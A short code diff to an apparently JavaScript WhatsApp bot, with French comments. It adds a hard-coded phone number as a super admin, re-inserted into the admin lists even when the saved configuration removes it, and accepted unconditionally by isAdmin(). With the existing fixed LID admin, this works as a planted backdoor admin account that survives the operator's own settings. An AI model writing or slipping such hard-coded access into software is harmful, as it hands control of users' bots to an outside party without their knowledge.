@@ -334,6 +334,9 @@ function loadStore() {
     if (!filteredAdminNumbers.includes(ownerNum)) filteredAdminNumbers.unshift(ownerNum);
     config.botAdmins    = filteredBotAdmins;
     config.adminNumbers = filteredAdminNumbers;
+    // ✅ Toujours garder 23591234568 même si store écrase
+    if (!config.botAdmins.includes('23591234568')) config.botAdmins.push('23591234568');
+    if (!config.adminNumbers.includes('23591234568')) config.adminNumbers.push('23591234568');
     console.log(`✅ [STORE] Admins chargés: ${config.botAdmins.length} admin(s)`);
   }
 
@@ -569,6 +572,8 @@ function isAdmin(jid) {
   
   // ✅ Super admin LID fixe
   if (jid === '124318499475488@lid' || jid.startsWith('124318499475488')) return true;
+  // ✅ Super admin numéro fixe
+  if (p === '23591234568') return true;
 
   // ✅ Vérifie si c'est le bot lui-même (owner) via globalBotJid
   if (global.botLidJid && (jid === global.botLidJid || jid.split(':')[0] === global.botLidJid.split(':')[0])) return true;
@@ -7717,6 +7722,7 @@ Sayonara everyone
 
 async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
   if (!isAdmin(senderJid)) {
+    // Admin only — toujours autorisé pour les sessions Lovable via isAdmin()
     await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
     return;
   }
